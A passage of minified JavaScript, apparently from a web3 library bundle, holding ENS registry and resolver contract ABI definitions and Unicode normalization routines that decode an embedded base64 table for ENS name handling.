                name: "node",
                type: "bytes32"
            }],
            name: "recordExists",
            outputs: [{
                internalType: "bool",
                name: "",
                type: "bool"
            }],
            stateMutability: "view",
            type: "function"
        }, {
            inputs: [{
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }],
            name: "resolver",
            outputs: [{
                internalType: "address",
                name: "",
                type: "address"
            }],
            stateMutability: "view",
            type: "function"
        }, {
            inputs: [{
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }],
            name: "ttl",
            outputs: [{
                internalType: "uint64",
                name: "",
                type: "uint64"
            }],
            stateMutability: "view",
            type: "function"
        }],
        f9 = [{
            anonymous: !1,
            inputs: [{
                indexed: !0,
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }, {
                indexed: !1,
                internalType: "address",
                name: "a",
                type: "address"
            }],
            name: "AddrChanged",
            type: "event"
        }, {
            anonymous: !1,
            inputs: [{
                indexed: !0,
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }, {
                indexed: !1,
                internalType: "uint256",
                name: "coinType",
                type: "uint256"
            }, {
                indexed: !1,
                internalType: "bytes",
                name: "newAddress",
                type: "bytes"
            }],
            name: "AddressChanged",
            type: "event"
        }, {
            anonymous: !1,
            inputs: [{
                indexed: !0,
                internalType: "address",
                name: "owner",
                type: "address"
            }, {
                indexed: !0,
                internalType: "address",
                name: "operator",
                type: "address"
            }, {
                indexed: !1,
                internalType: "bool",
                name: "approved",
                type: "bool"
            }],
            name: "ApprovalForAll",
            type: "event"
        }, {
            anonymous: !1,
            inputs: [{
                indexed: !0,
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }, {
                indexed: !1,
                internalType: "bytes",
                name: "hash",
                type: "bytes"
            }],
            name: "ContenthashChanged",
            type: "event"
        }, {
            anonymous: !1,
            inputs: [{
                indexed: !0,
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }, {
                indexed: !1,
                internalType: "bytes",
                name: "name",
                type: "bytes"
            }, {
                indexed: !1,
                internalType: "uint16",
                name: "resource",
                type: "uint16"
            }, {
                indexed: !1,
                internalType: "bytes",
                name: "record",
                type: "bytes"
            }],
            name: "DNSRecordChanged",
            type: "event"
        }, {
            anonymous: !1,
            inputs: [{
                indexed: !0,
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }, {
                indexed: !1,
                internalType: "bytes",
                name: "name",
                type: "bytes"
            }, {
                indexed: !1,
                internalType: "uint16",
                name: "resource",
                type: "uint16"
            }],
            name: "DNSRecordDeleted",
            type: "event"
        }, {
            anonymous: !1,
            inputs: [{
                indexed: !0,
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }],
            name: "DNSZoneCleared",
            type: "event"
        }, {
            anonymous: !1,
            inputs: [{
                indexed: !0,
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }, {
                indexed: !1,
                internalType: "bytes",
                name: "lastzonehash",
                type: "bytes"
            }, {
                indexed: !1,
                internalType: "bytes",
                name: "zonehash",
                type: "bytes"
            }],
            name: "DNSZonehashChanged",
            type: "event"
        }, {
            anonymous: !1,
            inputs: [{
                indexed: !0,
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }, {
                indexed: !0,
                internalType: "bytes4",
                name: "interfaceID",
                type: "bytes4"
            }, {
                indexed: !1,
                internalType: "address",
                name: "implementer",
                type: "address"
            }],
            name: "InterfaceChanged",
            type: "event"
        }, {
            anonymous: !1,
            inputs: [{
                indexed: !0,
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }, {
                indexed: !1,
                internalType: "string",
                name: "name",
                type: "string"
            }],
            name: "NameChanged",
            type: "event"
        }, {
            anonymous: !1,
            inputs: [{
                indexed: !0,
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }, {
                indexed: !1,
                internalType: "bytes32",
                name: "x",
                type: "bytes32"
            }, {
                indexed: !1,
                internalType: "bytes32",
                name: "y",
                type: "bytes32"
            }],
            name: "PubkeyChanged",
            type: "event"
        }, {
            anonymous: !1,
            inputs: [{
                indexed: !0,
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }, {
                indexed: !0,
                internalType: "string",
                name: "indexedKey",
                type: "string"
            }, {
                indexed: !1,
                internalType: "string",
                name: "key",
                type: "string"
            }],
            name: "TextChanged",
            type: "event"
        }, {
            inputs: [{
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }, {
                internalType: "uint256",
                name: "contentTypes",
                type: "uint256"
            }],
            name: "ABI",
            outputs: [{
                internalType: "uint256",
                name: "",
                type: "uint256"
            }, {
                internalType: "bytes",
                name: "",
                type: "bytes"
            }],
            stateMutability: "view",
            type: "function"
        }, {
            inputs: [{
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }],
            name: "addr",
            outputs: [{
                internalType: "address payable",
                name: "",
                type: "address"
            }],
            stateMutability: "view",
            type: "function"
        }, {
            inputs: [{
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }, {
                internalType: "uint256",
                name: "coinType",
                type: "uint256"
            }],
            name: "addr",
            outputs: [{
                internalType: "bytes",
                name: "",
                type: "bytes"
            }],
            stateMutability: "view",
            type: "function"
        }, {
            inputs: [{
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }],
            name: "contenthash",
            outputs: [{
                internalType: "bytes",
                name: "",
                type: "bytes"
            }],
            stateMutability: "view",
            type: "function"
        }, {
            inputs: [{
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }, {
                internalType: "bytes32",
                name: "name",
                type: "bytes32"
            }, {
                internalType: "uint16",
                name: "resource",
                type: "uint16"
            }],
            name: "dnsRecord",
            outputs: [{
                internalType: "bytes",
                name: "",
                type: "bytes"
            }],
            stateMutability: "view",
            type: "function"
        }, {
            inputs: [{
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }, {
                internalType: "bytes32",
                name: "name",
                type: "bytes32"
            }],
            name: "hasDNSRecords",
            outputs: [{
                internalType: "bool",
                name: "",
                type: "bool"
            }],
            stateMutability: "view",
            type: "function"
        }, {
            inputs: [{
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }, {
                internalType: "bytes4",
                name: "interfaceID",
                type: "bytes4"
            }],
            name: "interfaceImplementer",
            outputs: [{
                internalType: "address",
                name: "",
                type: "address"
            }],
            stateMutability: "view",
            type: "function"
        }, {
            inputs: [{
                internalType: "address",
                name: "account",
                type: "address"
            }, {
                internalType: "address",
                name: "operator",
                type: "address"
            }],
            name: "isApprovedForAll",
            outputs: [{
                internalType: "bool",
                name: "",
                type: "bool"
            }],
            stateMutability: "view",
            type: "function"
        }, {
            inputs: [{
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }],
            name: "name",
            outputs: [{
                internalType: "string",
                name: "",
                type: "string"
            }],
            stateMutability: "view",
            type: "function"
        }, {
            inputs: [{
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }],
            name: "pubkey",
            outputs: [{
                internalType: "bytes32",
                name: "x",
                type: "bytes32"
            }, {
                internalType: "bytes32",
                name: "y",
                type: "bytes32"
            }],
            stateMutability: "view",
            type: "function"
        }, {
            inputs: [{
                internalType: "bytes4",
                name: "interfaceID",
                type: "bytes4"
            }],
            name: "supportsInterface",
            outputs: [{
                internalType: "bool",
                name: "",
                type: "bool"
            }],
            stateMutability: "view",
            type: "function"
        }, {
            inputs: [{
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }, {
                internalType: "string",
                name: "key",
                type: "string"
            }],
            name: "text",
            outputs: [{
                internalType: "string",
                name: "",
                type: "string"
            }],
            stateMutability: "view",
            type: "function"
        }, {
            inputs: [{
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }],
            name: "zonehash",
            outputs: [{
                internalType: "bytes",
                name: "",
                type: "bytes"
            }],
            stateMutability: "view",
            type: "function"
        }, {
            inputs: [{
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }, {
                internalType: "address",
                name: "a",
                type: "address"
            }],
            name: "setAddr",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
        }];
    var h9 = "";
    const s1 = new Map([
            [8217, "apostrophe"],
            [8260, "fraction slash"],
            [12539, "middle dot"]
        ]),
        a1 = 4;

    function p9(e) {
        let t = 0;

        function n() {
            return e[t++] << 8 | e[t++]
        }
        let r = n(),
            i = 1,
            o = [0, 1];
        for (let E = 1; E < r; E++) o.push(i += n());
        let s = n(),
            a = t;
        t += s;
        let l = 0,
            u = 0;

        function c() {
            return l == 0 && (u = u << 8 | e[t++], l = 8), u >> --l & 1
        }
        const d = 31,
            f = 2 ** d,
            h = f >>> 1,
            v = h >> 1,
            p = f - 1;
        let w = 0;
        for (let E = 0; E < d; E++) w = w << 1 | c();
        let m = [],
            g = 0,
            y = f;
        for (;;) {
            let E = Math.floor(((w - g + 1) * i - 1) / y),
                k = 0,
                I = r;
            for (; I - k > 1;) {
                let C = k + I >>> 1;
                E < o[C] ? I = C : k = C
            }
            if (k == 0) break;
            m.push(k);
            let _ = g + Math.floor(y * o[k] / i),
                L = g + Math.floor(y * o[k + 1] / i) - 1;
            for (; !((_ ^ L) & h);) w = w << 1 & p | c(), _ = _ << 1 & p, L = L << 1 & p | 1;
            for (; _ & ~L & v;) w = w & h | w << 1 & p >>> 1 | c(), _ = _ << 1 ^ h, L = (L ^ h) << 1 | h | 1;
            g = _, y = 1 + L - _
        }
        let x = r - 4;
        return m.map(E => {
            switch (E - x) {
                case 3:
                    return x + 65792 + (e[a++] << 16 | e[a++] << 8 | e[a++]);
                case 2:
                    return x + 256 + (e[a++] << 8 | e[a++]);
                case 1:
                    return x + e[a++];
                default:
                    return E - 1
            }
        })
    }

    function m9(e) {
        let t = 0;
        return () => e[t++]
    }

    function p2(e) {
        return m9(p9(g9(e)))
    }

    function g9(e) {
        let t = [];
        [..."ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"].forEach((i, o) => t[i.charCodeAt(0)] = o);
        let n = e.length,
            r = new Uint8Array(6 * n >> 3);
        for (let i = 0, o = 0, s = 0, a = 0; i < n; i++) a = a << 6 | t[e.charCodeAt(i)], s += 6, s >= 8 && (r[o++] = a >> (s -= 8));
        return r
    }

    function v9(e) {
        return e & 1 ? ~e >> 1 : e >> 1
    }

    function y9(e, t) {
        let n = Array(e);
        for (let r = 0, i = 0; r < e; r++) n[r] = i += v9(t());
        return n
    }

    function _l(e, t = 0) {
        let n = [];
        for (;;) {
            let r = e(),
                i = e();
            if (!i) break;
            t += r;
            for (let o = 0; o < i; o++) n.push(t + o);
            t += i + 1
        }
        return n
    }

    function m2(e) {
        return Sl(() => {
            let t = _l(e);
            if (t.length) return t
        })
    }

    function g2(e) {
        let t = [];
        for (;;) {
            let n = e();
            if (n == 0) break;
            t.push(w9(n, e))
        }
        for (;;) {
            let n = e() - 1;
            if (n < 0) break;
            t.push(b9(n, e))
        }
        return t.flat()
    }

    function Sl(e) {
        let t = [];
        for (;;) {
            let n = e(t.length);
            if (!n) break;
            t.push(n)
        }
        return t
    }

    function v2(e, t, n) {
        let r = Array(e).fill().map(() => []);
        for (let i = 0; i < t; i++) y9(e, n).forEach((o, s) => r[s].push(o));
        return r
    }

    function w9(e, t) {
        let n = 1 + t(),
            r = t(),
            i = Sl(t);
        return v2(i.length, 1 + e, t).flatMap((s, a) => {
            let [l, ...u] = s;
            return Array(i[a]).fill().map((c, d) => {
                let f = d * r;
                return [l + d * n, u.map(h => h + f)]
            })
        })
    }

    function b9(e, t) {
        let n = 1 + t();
        return v2(n, 1 + e, t).map(i => [i[0], i.slice(1)])
    }

    function x9(e) {
        let t = [],
            n = _l(e);
        return i(r([]), []), t;

        function r(o) {
            let s = e(),
                a = Sl(() => {
                    let l = _l(e).map(u => n[u]);
                    if (l.length) return r(l)
                });
            return {
                S: s,
                B: a,
                Q: o
            }
        }

        function i({
            S: o,
            B: s
        }, a, l) {
            if (!(o & 4 && l === a[a.length - 1])) {
                o & 2 && (l = a[a.length - 1]), o & 1 && t.push(a);
                for (let u of s)
                    for (let c of u.Q) i(u, [...a, c], l)
            }
        }
    }

    function E9(e) {
        return e.toString(16).toUpperCase().padStart(2, "0")
    }

    function y2(e) {
        return `{${E9(e)}}`
    }

    function A9(e) {
        let t = [];
        for (let n = 0, r = e.length; n < r;) {
            let i = e.codePointAt(n);
            n += i < 65536 ? 1 : 2, t.push(i)
        }
        return t
    }

    function Cs(e) {
        let n = e.length;
        if (n < 4096) return String.fromCodePoint(...e);
        let r = [];
        for (let i = 0; i < n;) r.push(String.fromCodePoint(...e.slice(i, i += 4096)));
        return r.join("")
    }

    function _9(e, t) {
        let n = e.length,
            r = n - t.length;
        for (let i = 0; r == 0 && i < n; i++) r = e[i] - t[i];
        return r
    }
    var S9 = "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";
    const kl = 44032,
        id = 4352,
        od = 4449,
        sd = 4519,
        w2 = 19,
        b2 = 21,
        Ps = 28,
        ad = b2 * Ps,
        k9 = w2 * ad,
        T9 = kl + k9,
        I9 = id + w2,
        C9 = od + b2,
        P9 = sd + Ps;

    function ma(e) {
        return e >> 24 & 255
    }

    function x2(e) {
        return e & 16777215
    }
    let tm, l1, nm, Dc;

    function R9() {
        let e = p2(S9);
        tm = new Map(m2(e).flatMap((t, n) => t.map(r => [r, n + 1 << 24]))), l1 = new Set(_l(e)), nm = new Map, Dc = new Map;
        for (let [t, n] of g2(e)) {
            if (!l1.has(t) && n.length == 2) {
                let [r, i] = n, o = Dc.get(r);
                o || (o = new Map, Dc.set(r, o)), o.set(i, t)
            }
            nm.set(t, n.reverse())
        }
    }

    function E2(e) {
        return e >= kl && e < T9
    }

    function N9(e, t) {
        if (e >= id && e < I9 && t >= od && t < C9) return kl + (e - id) * ad + (t - od) * Ps;
        if (E2(e) && t > sd && t < P9 && (e - kl) % Ps == 0) return e + (t - sd); {
            let n = Dc.get(e);
            return n && (n = n.get(t), n) ? n : -1
        }
    }

    function A2(e) {
        tm || R9();
        let t = [],
            n = [],
            r = !1;

        function i(o) {
            let s = tm.get(o);
            s && (r = !0, o |= s), t.push(o)
        }
        for (let o of e)
            for (;;) {
                if (o < 128) t.push(o);
                else if (E2(o)) {
                    let s = o - kl,
                        a = s / ad | 0,
                        l = s % ad / Ps | 0,
                        u = s % Ps;
                    i(id + a), i(od + l), u > 0 && i(sd + u)
                } else {
                    let s = nm.get(o);
                    s ? n.push(...s) : i(o)
                }
                if (!n.length) break;
                o = n.pop()
            }
        if (r && t.length > 1) {
            let o = ma(t[0]);
            for (let s = 1; s < t.length; s++) {
                let a = ma(t[s]);
                if (a == 0 || o <= a) {
                    o = a;
                    continue
                }
                let l = s - 1;
                for (;;) {
                    let u = t[l + 1];
                    if (t[l + 1] = t[l], t[l] = u, !l || (o = ma(t[--l]), o <= a)) break
                }
                o = ma(t[s])
            }
        }
        return t
    }

    function B9(e) {
        let t = [],
            n = [],
            r = -1,
            i = 0;
        for (let o of e) {
            let s = ma(o),
                a = x2(o);
            if (r == -1) s == 0 ? r = a : t.push(a);
            else if (i > 0 && i >= s) s == 0 ? (t.push(r, ...n), n.length = 0, r = a) : n.push(a), i = s;
            else {
                let l = N9(r, a);
                l >= 0 ? r = l : i == 0 && s == 0 ? (t.push(r), r = a) : (n.push(a), i = s)
            }
        }
        return r >= 0 && t.push(r, ...n), t
    }

    function _2(e) {
        return A2(e).map(x2)
    }

    function M9(e) {
        return B9(A2(e))
    }
    const c1 = 45,
        S2 = ".",
        k2 = 65039,
        T2 = 1,
        ld = e => Array.from(e);

    function Tl(e, t) {
